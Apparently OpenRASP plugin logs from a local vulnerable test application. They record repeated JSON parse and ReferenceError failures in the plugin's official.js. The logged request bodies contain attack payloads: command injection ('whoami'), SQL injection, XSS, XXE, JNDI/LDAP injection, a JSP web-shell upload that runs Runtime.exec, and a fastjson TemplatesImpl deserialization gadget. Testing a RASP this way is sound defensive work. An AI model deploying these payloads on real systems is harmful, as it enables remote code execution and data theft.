+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,151 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,159 INFO  [http-nio-8002-exec-37][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,198 INFO  [http-nio-8002-exec-11][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,309 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,414 INFO  [http-nio-8002-exec-29][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,432 INFO  [http-nio-8002-exec-33][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,479 INFO  [http-nio-8002-exec-34][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,621 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,712 INFO  [http-nio-8002-exec-25][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,743 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,869 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:29,666 INFO  [http-nio-8002-exec-28][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:29,681 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:29,939 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:29,941 INFO  [http-nio-8002-exec-33][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:30,044 INFO  [http-nio-8002-exec-37][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:30,855 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:30,885 INFO  [http-nio-8002-exec-33][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:30,886 INFO  [http-nio-8002-exec-25][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:31,158 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:31,188 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:31,249 INFO  [http-nio-8002-exec-35][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:31,458 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:31,536 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:31,749 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:31,794 INFO  [http-nio-8002-exec-29][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:31,841 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:31,858 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:50:56,882 INFO  [Attach Listener][com.baidu.openrasp.plugin.js.log] [official] OpenRASP official plugin: Initialized, version 2022-0616-0730
+2024-05-06 23:50:59,010 INFO  [http-nio-8002-exec-14][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: i is not defined
+    at is_method_from_rasp (official.js:919:14)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:50:59,063 INFO  [http-nio-8002-exec-45][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Expression/spEL.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: i is not defined
+    at is_method_from_rasp (official.js:919:14)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:50:59,119 INFO  [http-nio-8002-exec-15][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:50:59,192 INFO  [http-nio-8002-exec-16][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/fileOutStreamWriteFile.do <native code>:0
+"file": "test.jsp", "content": "test"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2294:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:50:59,232 INFO  [http-nio-8002-exec-5][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:50:59,274 INFO  [http-nio-8002-exec-2][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/cookie/okHttp3.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:50:59,711 INFO  [http-nio-8002-exec-34][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/okHttp3.do <native code>:0
+root><file>1.txt</file><dest>1.jsp</dest></root>root><username>'/**/or/**/username='root</username></root>
+SyntaxError: Unexpected token r in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:50:59,889 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpConnection.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}root><file>1.txt</file><dest>1.jsp</dest></root>
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:00,192 INFO  [http-nio-8002-exec-3][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+document><root><url>https://www.baidu.com</url></root></document>
+SyntaxError: Unexpected token d in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:00,297 INFO  [http-nio-8002-exec-64][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/fileOutStreamWriteFile.do <native code>:0
+"file": "/usr/share/locale/locale.alias"}"root": {"url":"https://www.baidu.com"}}
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:00,772 INFO  [http-nio-8002-exec-45][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpConnection.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:01,487 INFO  [http-nio-8002-exec-26][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:06,115 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+file=%2Fusr%2Fshare%2Flocale%2Flocale.alias----------------------------146254230657383209827769
+SyntaxError: Unexpected token i in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:06,839 INFO  [http-nio-8002-exec-14][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/okHttp3.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}"root": {"file": "/etc", "suffix": "ntp.conf"}}"root": {"userId": "${jndi:ldap://localhost:8888}"}}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:07,538 INFO  [http-nio-8002-exec-16][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:07,615 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:08,494 INFO  [http-nio-8002-exec-63][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:08,589 INFO  [http-nio-8002-exec-7][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+----------------------------709354089703912954444775
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:09,150 INFO  [http-nio-8002-exec-14][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}"root": {"file": "/etc", "suffix": "ntp.conf"}}"root": {"userId": "${jndi:ldap://localhost:8888}"}}root><file>./1.txt</file></root>
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:09,854 INFO  [http-nio-8002-exec-7][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+----------------------------709354089703912954444775
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:09,868 INFO  [http-nio-8002-exec-64][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"file": "/usr/share/locale/locale.alias"}"root": {"url":"https://www.baidu.com"}}root><config><id>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</id></config></root>username=%27%2F%2A%2A%2For%2F%2A%2A%2Fusername%3D%27root"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:10,132 INFO  [http-nio-8002-exec-24][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}document><root><url>https://www.baidu.com</url></root></document>root><file>./1.txt</file></root>root><file>./1.txt</file></root>
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:10,303 INFO  [http-nio-8002-exec-64][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+"file": "/usr/share/locale/locale.alias"}"root": {"url":"https://www.baidu.com"}}root><config><id>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</id></config></root>username=%27%2F%2A%2A%2For%2F%2A%2A%2Fusername%3D%27root"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:10,316 INFO  [http-nio-8002-exec-44][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/get/unixProcess.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:10,447 INFO  [http-nio-8002-exec-32][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+document><root><url>https://www.baidu.com</url></root></document>----------------------------415366039725573298561477
+SyntaxError: Unexpected token d in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:10,613 INFO  [http-nio-8002-exec-51][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"file": "./1.txt"}root><file>/usr/share/locale/locale.alias</file></root>str=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E"root":{"xml":"<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>"}}"req":"POST /FileUpload/upload.do HTTP/1.1\nHost: localhost:8001\nContent-Length: 539\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryWqGd83IIbg2U327I\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundaryWqGd83IIbg2U327I\nContent-Disposition: form-data; name=\"username\"\n\nadmin\n------WebKitFormBoundaryWqGd83IIbg2U327I\nContent-Disposition: form-data; name=\"file\"; filename=\"=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?=\"\nContent-Type: application/octet-stream\n\n<%=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream())%>\n------WebKitFormBoundaryWqGd83IIbg2U327I\nContent-Disposition: form-data; name=\"submit\"\n\nSubmit\n------WebKitFormBoundaryWqGd83IIbg2U327I--\n", "protocol": "http"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:11,007 INFO  [http-nio-8002-exec-40][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+file=1.txt&dest=1.jsp"file": "/usr/share/locale/locale.alias"}file=.%2F1.txtexp=function%20test%28%29%7B%20return%20java.util.Arrays.toString%28new%0Ajava.io.File%28%27%2Fusr%27%29.list%28%29%29%7D%3Btest%28%29%3B----------------------------336857432262423855928359
+SyntaxError: Unexpected token i in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:12,545 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+root><file>./1.txt</file></root>root><file>./1.txt</file></root>root><file>test.jsp</file><content>test</content></root>
+SyntaxError: Unexpected token r in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:13,964 INFO  [http-nio-8002-exec-4][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/okHttp3.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:14,584 INFO  [http-nio-8002-exec-51][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/okHttp3.do <native code>:0
+"file": "./1.txt"}root><file>/usr/share/locale/locale.alias</file></root>str=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E"root":{"xml":"<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>"}}"req":"POST /FileUpload/upload.do HTTP/1.1\nHost: localhost:8001\nContent-Length: 539\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryWqGd83IIbg2U327I\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundaryWqGd83IIbg2U327I\nContent-Disposition: form-data; name=\"username\"\n\nadmin\n------WebKitFormBoundaryWqGd83IIbg2U327I\nContent
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:14,955 INFO  [http-nio-8002-exec-40][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/xml/okHttp3.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:15,014 INFO  [http-nio-8002-exec-54][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Expression/spEL.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:17,404 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}root><file>1.txt</file><dest>1.jsp</dest></root>----------------------------515845671470640735974979
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:1675:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:25,559 INFO  [http-nio-8002-exec-55][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:26,755 INFO  [http-nio-8002-exec-62][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpConnection.do <native code>:0
+file=1.txt&dest=1.jsp----------------------------688221571446797263900759
+SyntaxError: Unexpected token i in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:31,821 INFO  [http-nio-8002-exec-63][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:31,873 INFO  [http-nio-8002-exec-35][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:41,952 INFO  [http-nio-8002-exec-18][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:43,619 INFO  [http-nio-8002-exec-8][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:43,681 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:45,227 INFO  [http-nio-8002-exec-34][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+root><file>1.txt</file><dest>1.jsp</dest></root>root><username>'/**/or/**/username='root</username></root>----------------------------060593269755563334505118
+SyntaxError: Unexpected token r in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:45,315 INFO  [http-nio-8002-exec-18][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Deserialization/readObject.do <native code>:0
+json=%7B%22notes%22%3A%5B%22org.apache.xalan.xsltc.trax.TemplatesImpl%22%2C%7B%22transletName%22%3A%22businessObject%22%2C%22transletBytecodes%22%3A%5B%22yv66vgAAADMAMwoACQAlBwAmCAAnCgACACgKAAIAKQcAKgoABgArBwAsBwAtAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADBMY29tL2FuYmFpL3NlYy9jbGFzc2xvYWRlci9SQVNQQWJzdHJhY3RUcmFuc2xldDsBAAl0cmFuc2Zvcm0BAFAoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO1tMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEAHExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTsBABVzZXJpYWxpemF0aW9uSGFuZGxlcnMBADFbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALgEAcyhMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007TG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7TG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAA9kdG1BeGlzSXRlcmF0b3IBACRMb3JnL2FwYWNoZS94bWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBABRzZXJpYWxpemF0aW9uSGFuZGxlcgEAMExvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ%2BAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACoBAApTb3VyY2VGaWxlAQAZUkFTUEFic3RyYWN0VHJhbnNsZXQuamF2YQwACgALAQAMamF2YS9uZXQvVVJMAQAaaHR0cDovL2xvY2FsaG9zdDo4ODg4L3Jhc3AMAAoALwwAMAAxAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAMgALAQAuY29tL2FuYmFpL3NlYy9jbGFzc2xvYWRlci9SQVNQQWJzdHJhY3RUcmFuc2xldAEAL29yZy9hcGFjaGUveGFsYW4veHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAob3JnL2FwYWNoZS94YWxhbi94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAFShMamF2YS9sY